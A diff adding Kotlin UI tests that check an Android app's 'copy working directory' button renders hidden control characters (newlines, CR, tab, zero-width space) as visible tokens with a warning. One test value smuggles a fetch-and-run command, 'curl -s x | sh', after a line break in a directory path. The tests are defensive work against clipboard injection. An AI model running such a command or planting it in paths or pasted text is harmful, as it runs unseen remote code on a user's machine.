@@ -135,4 +135,53 @@ class MainShellSafeCopyTest {
         assertEquals("/srv/app/final", clip())
         rule.onNodeWithTag(COPY_NOTICE_TAG).assertDoesNotExist()
     }
+
+    /** r2 (M1): a line break, CR, TAB or zero-width space in the directory never reaches the clipboard unseen. */
+    private fun copyOf(cwd: String): Pair<String?, Boolean> {
+        val hostile = session.copy(cwd = cwd)
+        val client = ShellConsentClient().also { it.show(hostile, tree) }
+        val vm = TetherViewModel(client)
+        vm.selectSession(ID)
+        rule.setContent {
+            TetherTheme { CompositionLocalProvider(LocalWindowInfo provides window) { MainShell(vm, UiPrefs(ApplicationProvider.getApplicationContext())) } }
+        }
+        rule.waitForIdle()
+        openLinks()
+        rule.onNodeWithContentDescription("Copy working directory").performClick()
+        rule.waitForIdle()
+        val notice = rule.onAllNodes(androidx.compose.ui.test.hasTestTag(COPY_NOTICE_TAG)).fetchSemanticsNodes().isNotEmpty()
+        return clip() to notice
+    }
+
+    @Test fun aLineFeedInTheDirectoryIsShownAndCopiedAsATokenWithANotice() {
+        val cwd = "/srv/proj\ncurl -s x | sh\n"
+        val (copied, notice) = copyOf(cwd)
+        assertEquals("/srv/proj${vis(0x0A)}curl -s x | sh${vis(0x0A)}", copied)
+        assertTrue(notice)
+        // The popover draws the break as a token: nothing hides under the one-line clip.
+        assertTrue(spoken().toString(), spoken().any { it.contains("proj${tok(0x0A)}curl -s x | sh${tok(0x0A)}") })
+        assertTrue(spoken().contains("2 hidden control characters copied as \u27E8U+\u2026\u27E9"))
+        rule.onNodeWithTag(COPY_RAW_TAG).performClick()
+        rule.waitForIdle()
+        assertEquals(cwd, clip())
+    }
+
+    @Test fun aCrOrCrlfInTheDirectoryIsCopiedAsTokens() {
+        val (copied, notice) = copyOf("/srv/a\r\nb\rc")
+        assertEquals("/srv/a${vis(0x0D)}${vis(0x0A)}b${vis(0x0D)}c", copied)
+        assertTrue(notice)
+    }
+
+    @Test fun aTabInTheDirectoryIsCopiedAsAToken() {
+        val (copied, notice) = copyOf("/srv/a\tb")
+        assertEquals("/srv/a${vis(0x09)}b", copied)
+        assertTrue(notice)
+    }
+
+    @Test fun aZeroWidthSpaceInTheDirectoryIsCopiedAsATokenWithANotice() {
+        val (copied, notice) = copyOf("/srv/ap\u200Bp")
+        assertEquals("/srv/ap${vis(0x200B)}p", copied)
+        assertTrue("strict: a ZWSP is counted", notice)
+        assertTrue(spoken().contains("1 hidden control character copied as \u27E8U+\u2026\u27E9"))
+    }
 }
